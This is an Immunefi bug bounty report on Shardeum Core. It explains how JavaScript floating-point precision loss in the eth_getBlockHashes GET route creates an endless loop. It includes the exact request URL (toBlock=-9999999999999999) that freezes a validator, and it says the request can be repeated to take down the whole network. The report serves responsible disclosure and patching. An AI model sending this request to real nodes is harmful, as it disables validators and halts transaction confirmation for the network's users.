# A math quirk in Javascript allows anyone to take down any validator or the full network with an HTTP GET request.

Submitted on Jul 28th 2024 at 11:09:12 UTC by @infosec_us_team for [Boost | Shardeum: Core](https://immunefi.com/bounty/shardeum-core-boost/)

Report ID: #33745

Report type: Blockchain/DLT

Report severity: Critical

Target: https://github.com/shardeum/shardeum/tree/dev

Impacts:
- Network not being able to confirm new transactions (total network shutdown)

## Description
# Brief/Intro
In this report, we demonstrate how to abuse a Javascript quirk related to "loss of precision" when doing math with large numbers, to send an HTTP GET request that can take down a single victim node or the entire network.

# Description

## Javascript precision loss with large numbers

Understanding the existence of the quirks we will abuse is crucial to understanding at its core **why** the code is exploited, and how to correctly patch the bug.

Please, to follow along, we strongly recommend going to a Javascript Playground, or opening the browser console, and experimenting with the concepts we'll explain.

### 1- Auto-rounding

Let's start by checking the output to the following Javascript code:
```
let a_number = Number(9999999999999999);

console.log(`a_number: ${a_number}`);

// Output: "a_number: 10000000000000000"
```

Instead of `"a_number: 9999999999999999"` as you may expect, due to how Floating-Point Arithmetic works in Javascript the number is rounded up as soon as it is assigned to a variable.

The same happens if we use `parseInt(...)` and give it as a string:
```
let a_number = parseInt("9999999999999999");

console.log(`a_number: ${a_number}`);

// Output: "a_number: 10000000000000000"
```

### 2- Rounding down in arithmetic operations

If we add 1 to this value (*10000000000000000*), the result rounds down by 1, leaving the operation unchanged:
```
console.log(`a_number + 1 = ${a_number + 1}`);
// Output: "a_number + 1 = 10000000000000000"
```

It doesn't matter how many times we add **1 unit** to **10000000000000000**, the result is always the same:
```
console.log(`a_number + 1 = ${a_number + 1 + 1 + 1 + 1 + 1 + 1}`);
// Output: "a_number + 1 = 10000000000000000"
```

These behaviors are not a JavaScript "feature" and have been around for quite a while. Instead of trying to explain them here, we'll just leave a link to a great website dedicated exclusively to explaining how floating-point math works: https://floating-point-gui.de/

Now that you have an idea of what type of quirks we exploit in this report, let's dive into the Shardeum code.

## Vulnerable code

The vulnerable entry point is the HTTP **GET** route `eth_getBlockHashes`.  Here's as a reference:

```
  shardus.registerExternalGet('eth_getBlockHashes', externalApiMiddleware, async (req, res) => {

    let fromBlock: any = req.query.fromBlock
    let toBlock: any = req.query.toBlock

    if (fromBlock == null) return res.json({ error: 'Missing fromBlock' })
    if (typeof fromBlock === 'string') fromBlock = parseInt(fromBlock)
    if (fromBlock < latestBlock - ShardeumFlags.maxNumberOfOldBlocks) {
      // return max 100 blocks
      fromBlock = latestBlock - ShardeumFlags.maxNumberOfOldBlocks + 1 // 1 is added for safety
    }
    if (toBlock == null) toBlock = latestBlock
    if (typeof toBlock === 'string') fromBlock = parseInt(toBlock)
    if (toBlock > latestBlock) toBlock = latestBlock

    const blockHashes = []
    for (let i = fromBlock; i <= toBlock; i++) {
      const block = readableBlocks[i]
      if (block) blockHashes.push(block.hash)
    }
    return res.json({ blockHashes, fromBlock, toBlock })
  })
```

Let's debug it step-by-step.

**Step 1-** It asks for 2 values, *fromBlock* and *toBlock*.
```
    let fromBlock: any = req.query.fromBlock
    let toBlock: any = req.query.toBlock
```

In our exploit we will visit the following URL: http://`SERVER_IP`:`VICTIM_PORT`/eth_getBlockHashes?fromBlock=0&toBlock=-9999999999999999 therefore the values for `fromBlock` and `toBlock` will be `0` and `-9999999999999999`.

```
  ┌─────────────┐  
  │fromBlock = 0│  
  └──────┬──────┘  
┌────────▽────────┐
│toBlock =        │
│-9999999999999999│
└─────────────────┘
```

**Step 2-** If the type of value given in *toBlock* is a string - which it is being interpreted as one - then the value of `fromBlock` is replaced with the output of `parseInt(toBlock)`.
```
if (typeof toBlock === 'string') fromBlock = parseInt(toBlock)
```

As we saw in the section above, you may expect the output to be **-9999999999999999**, but due to how Floating-Point Arithmetic works in Javascript is **-10000000000000000**

```
  ┌─────────────┐  
  │fromBlock = 0│  
  └──────┬──────┘  
┌────────▽────────┐                     
│toBlock =        │                     
│-9999999999999999│                     
└────────┬────────┘                     
    _____▽_____     ┌──────────────────┐
   ╱           ╲    │fromBlock =       │
  ╱ If toBlock  ╲___│-10000000000000000│
  ╲ is a String ╱yes└──────────────────┘
   ╲___________╱                        
          no                            
```

**Step 3-** We start looping from an index `i` which starts with the same value as `fromBlock` (*-10000000000000000*), we add 1 unit to `i` every time the code is ran, and we do it until `i` is bigger than the value of `toBlock` (*-9999999999999999*)

```
    const blockHashes = []
    
    for (let i = fromBlock; i <= toBlock; i++) {
      const block = readableBlocks[i]
      if (block) blockHashes.push(block.hash)
    }
```

Due to how Floating-Point Arithmetic works in Javascript, adding `1 + -10000000000000000` results in `-10000000000000000`. The value does not increase.

```

```

As a result, the **for** loop runs forever, it never stops.

## Impact Details

- The victim can be a single node or all nodes in the blockchain - it doesn't matter if they are active or not - bricking the entire network.

- Anyone can exploit it. The attacker doesn't have to be a validator in the network.

- The victim node will run code in a loop forever, aggressively consuming computing resources.

- All other endpoints (HTTP and Gossips) of the victim node become unresponsive. Visiting or requesting any of them will timeout.

- The rest of the nodes start to timeout their requests to the victim node and report him as lost, which may lead to a slashing event for becoming unresponsive without gossiping anything to the rest of the network.

- The victim node is removed from the network.




## Proof of Concept

**Step 1-** Start the Shardeum network locally.

**Step 2-** Wait until cycle counter 15, where all nodes are active.

**Step 3-** Visit the following link: http://`SERVER_IP`:`VICTIM_PORT`/eth_getBlockHashes?fromBlock=0&toBlock=-9999999999999999

> Replace `SERVER_IP` with the IP of the server and `VICTIM_PORT` with the PORT where the victim node is running.

You have now bricked the node.

- Visit the network monitor at `http://SERVER_IP:3000` and you will see a red dot over the victim node, instead of a green one.

- Some nodes will try to interact with the victim and all their messages will timeout.

Below is an example of the output from a healthy node running in port 9002, trying to interact with the victim node to compare certs:

```

```
> This output is from a log file located at `./instances/shardus-instance-9002/logs/main.log` - the victim node was running at port 9005 and the healthy one trying to contact him was at port 9002.

Repeat **Step 3** as many times as desired to take down as many validators as you wish.
